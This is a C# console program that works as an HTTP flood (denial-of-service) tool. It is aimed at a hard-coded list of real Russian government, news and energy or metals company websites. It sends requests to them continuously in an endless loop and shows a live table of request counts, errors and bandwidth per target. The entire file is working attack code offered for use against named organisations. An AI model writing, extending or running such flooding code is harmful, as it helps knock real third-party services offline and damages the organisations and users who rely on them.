using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;

namespace petrom
{
    class Program
    {
        private static Decoder Decoder = Encoding.UTF8.GetDecoder();
        private int BytesReceived;
        private const int MaxRequestsInFlight = 20;
        private DateTime LastReportTime;
        class RequestState
        {
            public HttpWebRequest Request;
            public byte[] Buffer = new byte[16384];
            public Stream Stream;
            public UrlState UrlState;
        }

        static void Main(string[] args)
        {
            var prog = new Program();
            prog.Run();
        }

        private string[] _urls = new[]
        {
            "https://rmk-group.ru/ru",
            "https://lenta.ru",
            "https://www.tmk-group.ru",
            "https://ya.ru",
            "https://www.polymetalinternational.com/ru",
            "https://vesti.ru",
            "https://m.vesti.ru",
            "https://ria.ru",
            "https://mail.rkn.gov.ru",
            "https://cloud.rkn.gov.ru",
            "https://mvd.gov.ru",
            "https://pwd.wto.economy.gov.ru", 
            "https://stroi.gov.ru",
            "https://proverki.gov.ru",
            "https://www.gazprom.ru",
            "https://lukoil.ru",
            "https://magnit.ru",
            "https://www.nornickel.com",
            "https://www.surgutneftegas.ru",
            "https://www.tatneft.ru",
            "https://www.evraz.com/ru",
            "https://nlmk.com",
            "https://www.sibur.ru",
            "https://www.severstal.com",
            "https://www.metalloinvest.com",
            "https://nangs.org",
            "https://www.uralkali.com/ru",
            "https://www.eurosib.ru",
            "https://omk.ru",
        };

        class UrlState
        {
            public string Url;
            public int NumRequestsInFlight;
            public int Tx;
            public int PrevTx;
            public int NumErrors;
            public int NumReadErrors;
            public int NumRequests;
            public double AvgKbps;
        }

        private UrlState[] _urlStates;

        private string[] _colNames = new string[]
        {
            "Url",
            "Errs",
            "Reqs",
            "Kbps",
            "Kbps(avg)"
        };

        private int[] _cols = new int[]
        {
            25,
            10,
            10,
            10,
            10
        };

        private StringBuilder _sb = new StringBuilder();
        void PrintFmt(int[] cols, params string[] pars)
        {
            _sb.Clear();
            for (int i = 0; i < Math.Min(cols.Length, pars.Length); ++i)
            {
                var str = pars[i];
                if (str.Length < cols[i])
                {
                    _sb.Append(str);
                    for (int j = str.Length; j < cols[i]; ++j)
                    {
                        _sb.Append(" ");
                    }
                }
                else
                {
                    _sb.Append(str.AsSpan(0, cols[i]));
                }

                _sb.Append(" ");
            }
            Console.WriteLine(_sb.ToString());
        }

        void Run()
        {
            _urlStates = _urls.Select(u => new UrlState
            {
                Url = u
            }).ToArray();

            //main loop
            LastReportTime = new DateTime();

            while (true)
            {
                var maxPerTick = 50;
                for (int i = 0; i < maxPerTick; ++i)
                {
                    SpawnRequest();
                }


                var now = DateTime.Now;
                if (now >= LastReportTime.AddSeconds(1))
                {
                    Console.Clear();
                    Console.WriteLine(now);
                    PrintFmt(_cols, _colNames);
                    var passed = (now - LastReportTime).TotalSeconds;
                    foreach (var url in _urlStates)
                    {
                        var tx = url.Tx;
                        Interlocked.Add(ref url.Tx, -tx);
                        var kbps = tx / (passed * 1024);
                        var k = 0.2;
                        url.AvgKbps = url.AvgKbps * (1 - k) + kbps * k;
                        PrintFmt(_cols,
                            url.Url,
                            $"{url.NumErrors}/{url.NumReadErrors}",
                            $"{url.NumRequestsInFlight} ({url.NumRequests})",
                            ((int)(kbps)).ToString(),
                            $"{url.AvgKbps:F2}"
                            );
                    }

                    LastReportTime = now;
                }

                Thread.Sleep(50);
            }
        }

        void SpawnRequest()
        {
            //select Url
            //what strategy shoud I use?
            //lets start with even reqs in flight per Url
            UrlState urlState = null;

            lock (_urlStates)
            {
                foreach (var state in _urlStates)
                {
                    if (state.NumRequestsInFlight * _urlStates.Length < MaxRequestsInFlight)
                    {
                        urlState = state;
                        break;
                    }
                }
            }

            if (urlState == null)
                return;

            var req = WebRequest.Create(urlState.Url) as HttpWebRequest;
            var rs = new RequestState
            {
                Request = req,
                UrlState = urlState
            };

            Interlocked.Increment(ref urlState.NumRequests);
            Interlocked.Increment(ref urlState.NumRequestsInFlight);

            req.BeginGetResponse(RespCallback, rs);
        }

        void RespCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as RequestState;
            HttpWebResponse resp = null;
            try
            {
                resp = state.Request.EndGetResponse(ar) as HttpWebResponse;
            }
            catch (Exception ex)
            {
                Interlocked.Add(ref state.UrlState.NumErrors, 1);
                Interlocked.Decrement(ref state.UrlState.NumRequestsInFlight);
                return;
            }
            
            state.Stream = resp.GetResponseStream();
            state.Stream.BeginRead(state.Buffer, 0, state.Buffer.Length, ReadCallback, state);
        }

        void ReadCallback(IAsyncResult ar)
        {
            var state = ar.AsyncState as RequestState;
            int read = 0;
            try
            {
                read = state.Stream.EndRead(ar);
            }
            catch (Exception ex)
            {
                Interlocked.Increment(ref state.UrlState.NumReadErrors);
                Interlocked.Decrement(ref state.UrlState.NumRequestsInFlight);
                state.Request.Abort();
            }
            
            if (read > 0)
            {
                Interlocked.Add(ref BytesReceived, read);
                Interlocked.Add(ref state.UrlState.Tx, read);
                //var buffer = new char[read*2];
                //var len = Decoder.GetChars(state.Buffer, 0, read, buffer, 0);
                //var str = new String(buffer, 0, len);
                //Console.WriteLine(str);
                state.Stream.BeginRead(state.Buffer, 0, state.Buffer.Length, ReadCallback, state);
            }
            else
            {
                Interlocked.Decrement(ref state.UrlState.NumRequestsInFlight);
            }
        }
    }
}

